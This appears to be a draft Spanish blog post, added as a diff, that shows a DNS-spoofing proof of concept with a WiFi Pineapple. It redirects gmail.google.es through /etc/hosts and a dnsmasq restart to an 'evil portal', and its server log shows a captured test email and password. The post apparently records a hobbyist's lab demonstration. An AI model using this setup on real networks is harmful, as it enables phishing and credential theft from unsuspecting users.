@@ -1,0 +1,40 @@
+---
+title: 'DNS Spoofing - POC'
+date: '2023-01-03'
+tags: ["DNS Spoofing", "POC"]
+draft: true
+authors: ['default']
+summary: 'Hace poco me compré el WiFi Pineapple Mk7 de Hack5. Y voy a explicar como funciona los dns utilizand'
+---
+
+Hace poco me compré el WiFi Pineapple Mk7 de Hack5. Y voy a explicar como funciona los dns utilizando ilustraciones de *[Julia Evans (@b0rk)](https://wizardzines.com/)*
+
+![](/static/images/uploads/wifi-pineapple-mkvii/life-of-a-dns-query.webp)
+
+Update /etc/hosts
+
+⚠️ey!
+```
+# File: /etc/hosts
+# 
+#  
+192.168.0.10 doogle.es
+```
+Clear DNS cache
+
+
+```
+# killall dnsmasq && /etc/init.d/dnsmasq start
+```
+Vamos al movil
+
+![](/static/images/uploads/wifi-pineapple-mkvii/iphone14\_spoof.webp)
+
+DNS Spoofing gmail.google.esy ahora de nuevo
+
+
+```
+evil-portals  | 172.18.0.1 - - [04/Jan/2023:19:40:05 +0000] "GET /assets/css/custom.css HTTP/1.1" 200 1263 "http://gmail.google.es/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1"
+
+evil-portals  | 172.18.0.1 - - [04/Jan/2023:19:40:53 +0000] "GET /controller.php?email=Iker%40prueba.es&password=TeNmUcHoCuIdAdO&hostname=&mac=&ip=172.18.0.1&target=http%3A%2F%2Fgmail.google.es%2F HTTP/1.1" 302 266 "http://gmail.google.es/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1"
+```
